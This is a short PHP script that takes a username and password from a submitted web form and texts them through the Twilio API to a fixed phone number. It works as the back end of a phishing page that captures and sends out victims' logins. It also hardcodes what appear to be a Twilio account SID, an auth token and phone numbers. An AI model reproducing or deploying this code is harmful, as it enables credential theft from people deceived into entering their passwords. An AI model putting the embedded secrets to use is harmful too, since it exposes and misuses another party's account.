<?php
require __DIR__ . '/vendor/autoload.php'; // Autoload the Twilio SDK

use Twilio\Rest\Client;

// Twilio credentials
$account_sid = 'AC5823294e82cf75e08b38841fa060bcc9';
$auth_token = '50a66d60c90a927e1e02372e57efe2e9';
$twilio_phone_number = '+18582814499';
$destination_phone_number = '7010321657'; // The phone number to send the SMS

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    $messageBody = "Username/Email: $username\nPassword: $password";

    try {
        // Initialize the Twilio client
        $client = new Client($account_sid, $auth_token);

        // Send the SMS
        $client->messages->create(
            $destination_phone_number,
            [
                'from' => $twilio_phone_number,
                'body' => $messageBody
            ]
        );

        echo "Message sent successfully!";
    } catch (Exception $e) {
        echo "Failed to send message: " . $e->getMessage();
    }
}
?>
